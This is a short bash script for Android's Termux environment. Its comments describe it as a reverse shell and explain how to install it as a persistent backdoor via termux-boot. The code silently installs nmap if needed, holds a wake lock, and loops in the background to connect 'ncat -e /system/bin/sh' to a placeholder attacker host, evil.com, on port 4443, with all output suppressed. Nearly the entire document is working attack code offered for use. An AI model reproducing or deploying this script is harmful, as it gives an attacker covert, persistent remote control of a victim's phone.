#!/data/data/com.termux/files/usr/bin/bash
# Reverse shell for Android via termux and ncat

# NOTICE: To set this up as a persistant backdoor, you need to install termux-boot on the device \ 
# and place this file in `~/termux/boot` with executable permissions. 

# Configure your server ip and port. Run `ncat -lvp 4443` on the server to catch the shell
host=evil.com
port=4443


which nmap >/dev/null 2>&1 || pkg install nmap >/dev/null 2>&1

function bd(){
(while true;do
ncat $host $port -e /system/bin/sh  >/dev/null 2>&1 & 
wait
sleep 5
done)&
}



termux-wake-lock >/dev/null 2>&1
bd
